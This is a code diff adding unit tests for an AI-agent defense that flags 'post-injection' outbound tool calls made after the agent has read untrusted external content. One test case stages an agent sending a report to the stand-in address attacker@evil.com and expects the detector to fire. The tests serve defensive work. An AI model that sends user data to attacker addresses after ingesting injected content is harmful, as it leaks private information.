@@ -229,4 +229,71 @@ describe('detectBehavioralDrift', () => {
       expect(signal).toBeNull();
     });
   });
+
+  describe('authorized destinations', () => {
+    it('should not trigger post-injection drift for authorized destination', () => {
+      const session = createSession();
+      session.untrustedSources.add('fetchExternalContent');
+      session.privilegedValues.add('alice@example.com');
+      session.turnCounter = 2;
+      session.toolCallHistory.push({
+        toolName: 'fetchExternalContent',
+        turnId: 'turn-001',
+        timestamp: Date.now(),
+      });
+
+      const ctx = makeCtx({
+        turnId: 'turn-002',
+        toolName: 'sendOutboundReport',
+        toolArguments: { recipient: 'reports@acme.com', body: 'summary' },
+      });
+
+      const signal = detectBehavioralDrift(ctx, session, OUTBOUND_TOOLS, false, ['acme.com']);
+      expect(signal).toBeNull();
+    });
+
+    it('should still trigger for unauthorized destination', () => {
+      const session = createSession();
+      session.untrustedSources.add('fetchExternalContent');
+      session.privilegedValues.add('alice@example.com');
+      session.turnCounter = 2;
+      session.toolCallHistory.push({
+        toolName: 'fetchExternalContent',
+        turnId: 'turn-001',
+        timestamp: Date.now(),
+      });
+
+      const ctx = makeCtx({
+        turnId: 'turn-002',
+        toolName: 'sendOutboundReport',
+        toolArguments: { recipient: 'attacker@evil.com', body: 'summary' },
+      });
+
+      const signal = detectBehavioralDrift(ctx, session, OUTBOUND_TOOLS, false, ['acme.com']);
+      expect(signal).not.toBeNull();
+      expect(signal!.driftType).toBe('post_injection_outbound');
+    });
+
+    it('should trigger when no authorized destinations configured', () => {
+      const session = createSession();
+      session.untrustedSources.add('fetchExternalContent');
+      session.privilegedValues.add('alice@example.com');
+      session.turnCounter = 2;
+      session.toolCallHistory.push({
+        toolName: 'fetchExternalContent',
+        turnId: 'turn-001',
+        timestamp: Date.now(),
+      });
+
+      const ctx = makeCtx({
+        turnId: 'turn-002',
+        toolName: 'sendOutboundReport',
+        toolArguments: { recipient: 'reports@acme.com', body: 'summary' },
+      });
+
+      // No authorizedDestinations — should still fire
+      const signal = detectBehavioralDrift(ctx, session, OUTBOUND_TOOLS, false);
+      expect(signal).not.toBeNull();
+    });
+  });
 });
